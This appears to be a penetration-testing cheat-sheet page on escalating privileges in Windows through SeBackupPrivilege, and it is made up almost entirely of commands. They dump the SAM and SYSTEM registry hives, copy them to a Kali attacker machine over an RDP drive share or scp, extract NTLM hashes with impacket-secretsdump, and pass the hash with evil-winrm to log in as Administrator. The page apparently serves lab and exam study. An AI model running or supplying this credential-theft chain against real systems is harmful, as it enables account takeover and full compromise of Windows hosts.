# SeBackupPrivilege

Check privileges:

```powershell
whoami /priv
```

* SeBackupPrivilege must be present

[NLTM](../nltm.md)

#### Exploitation:

1. Create a temp directory:

```powershell
mkdir C:\temp
```

2. Copy the sam and system hive of HKLM to C:\temp and then download them.

```powershell
reg save hklm\sam C:\temp\sam.hive
```

and

```powershell
reg save hklm\system C:\temp\system.hive
```

3. Transfer files to kali machine

**Enable drive direction on RDP session:**

{% code overflow="wrap" %}
```sh
xfreerdp /v:192.168.224.220 /u:dave /p:lab +clipboard /cert:ignore /drive:KaliShare,/home/kali/share
```
{% endcode %}

**If SSH is available:**

```shell
sudo systemctl start ssh
#on kali
```

```powershell
scp C:\temp\sam.hive kali@192.168.X.X:/home/kali/
```

4. Obtain ntlm hashes:

{% code overflow="wrap" %}
```sh
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```
{% endcode %}

5. Use evil-winrm to pass the hash and connect as Local Administrator:

```sh
evil-winrm -i <ip> -u "Administrator" -H "<hash>"
```
